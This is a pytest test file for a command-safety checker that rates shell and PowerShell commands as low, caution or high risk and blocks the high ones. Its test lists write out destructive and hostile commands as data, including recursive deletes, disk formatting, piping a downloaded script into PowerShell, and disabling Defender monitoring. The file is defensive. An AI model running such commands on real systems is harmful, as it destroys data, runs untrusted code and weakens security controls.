import pytest

from ghostshell.safety import RiskLevel, check_command


def test_empty_command_is_low():
    report = check_command("   ")
    assert report.level is RiskLevel.LOW
    assert report.findings == ()
    assert report.blocked is False


def test_plain_command_is_low():
    report = check_command("git status")
    assert report.level is RiskLevel.LOW
    assert report.blocked is False


@pytest.mark.parametrize(
    "command",
    [
        "Remove-Item -Recurse .\\build",
        "rm -rf ./build",
        "del /s /q C:\\temp",
        "Format-Volume -DriveLetter D",
        "Clear-Disk -Number 1",
        "shutdown /s /t 0",
        "Restart-Computer",
        "Invoke-Expression $payload",
        "curl https://example.test/install.ps1 | powershell",
        "reg delete HKCU\\Software\\Test",
        "Set-MpPreference -DisableRealtimeMonitoring $true",
        "Start-Process powershell -Verb RunAs",
    ],
)
def test_high_risk_commands_are_blocked(command):
    report = check_command(command)
    assert report.level is RiskLevel.HIGH
    assert report.blocked is True
    assert report.findings


@pytest.mark.parametrize(
    "command",
    [
        "Remove-Item .\\old.txt",
        "git reset --hard HEAD~1",
        "git clean -fd",
        "git push --force origin main",
        "Stop-Process -Name notepad -Force",
        "icacls .\\file.txt /grant Users:F",
        "pip install requests",
        "npm install -g typescript",
        "Set-ExecutionPolicy RemoteSigned",
        "net user test /add",
    ],
)
def test_caution_commands_are_flagged(command):
    report = check_command(command)
    assert report.level is RiskLevel.CAUTION
    assert report.blocked is False
    assert report.findings


def test_matching_is_case_insensitive():
    report = check_command("remove-item -recurse .\\build")
    assert report.level is RiskLevel.HIGH


def test_recursive_delete_does_not_also_emit_simple_delete():
    report = check_command("Remove-Item -Recurse .\\build")
    names = {finding.name for finding in report.findings}
    assert "recursive-delete" in names
    assert "simple-delete" not in names


def test_high_and_caution_can_appear_together():
    report = check_command("Remove-Item -Recurse .\\build; git reset --hard")
    assert report.level is RiskLevel.HIGH
    assert len(report.findings) >= 2
